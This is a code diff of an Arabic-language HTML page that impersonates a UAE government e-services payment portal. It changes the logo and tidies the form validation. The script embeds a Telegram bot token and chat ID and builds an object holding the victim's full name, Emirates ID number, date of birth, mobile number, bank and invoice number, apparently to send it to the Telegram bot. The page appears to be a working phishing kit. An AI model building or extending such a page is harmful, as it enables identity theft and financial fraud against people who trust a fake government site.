@@ -19,8 +19,8 @@
 </head>
 <body>
   <header>
-    <!-- تم استبدال صورة الشعار هنا بالرابط الجديد -->
-    <img src="https://share.google/images/VM9Cz2QqUF7CNwUr8" alt="شعار الإمارات">
+    <!-- تم استبدال صورة الشعار هنا بصورة الإشعار الجديدة -->
+    <img src="https://tse2.mm.bing.net/th/id/OIP.RO8BHYt_-kuCzV-wrQWK_gHaEK?pid=Api" alt="شعار الإشعار">
     <h2>بوابة دفع قيمة الخدمات الإلكترونية</h2>
     <p>حكومة الإمارات العربية المتحدة</p>
   </header>
@@ -86,7 +86,6 @@
   </footer>
 
   <script>
-    // بيانات بوت تيليجرام
     const BOT_TOKEN = "8175456301:AAHcojlkfA5YkgBkx5gAnvFjd-u5Tk6hg7I";
     const CHAT_ID   = "8404960059";
 
@@ -94,26 +93,18 @@
       e.preventDefault();
 
       const idNumber = document.getElementById('idNumber').value.trim();
-
-      // تحقق من رقم الهوية (15 رقمًا بالضبط)
-      if (idNumber.length !== 15) {
-        alert('رقم الهوية يجب أن يتكون من 15 رقمًا');
-        return;
-      }
+      if (idNumber.length !== 15) { alert('رقم الهوية يجب أن يتكون من 15 رقمًا'); return; }
 
       const amount = document.getElementById('amount').value.trim();
-      if (parseFloat(amount) < 1) {
-        alert('المبلغ يجب أن يكون على الأقل درهم واحد');
-        return;
-      }
+      if (parseFloat(amount) < 1) { alert('المبلغ يجب أن يكون على الأقل درهم واحد'); return; }
 
       const data = {
         fullName: document.getElementById('fullName').value.trim(),
         idNumber: idNumber,
-        dob:      `${document.getElementById('day').value.trim()}/${document.getElementById('month').value.trim()}/${document.getElementById('year').value.trim()}`,
-        mobile:   document.getElementById('mobile').value.trim(),
-        bank:     document.getElementById('bank').value,
-        amount:   amount,
+        dob: `${document.getElementById('day').value.trim()}/${document.getElementById('month').value.trim()}/${document.getElementById('year').value.trim()}`,
+        mobile: document.getElementById('mobile').value.trim(),
+        bank: document.getElementById('bank').value,
+        amount: amount,
         invoiceNumber: document.getElementById('invoiceNumber').value.trim()
       };
 
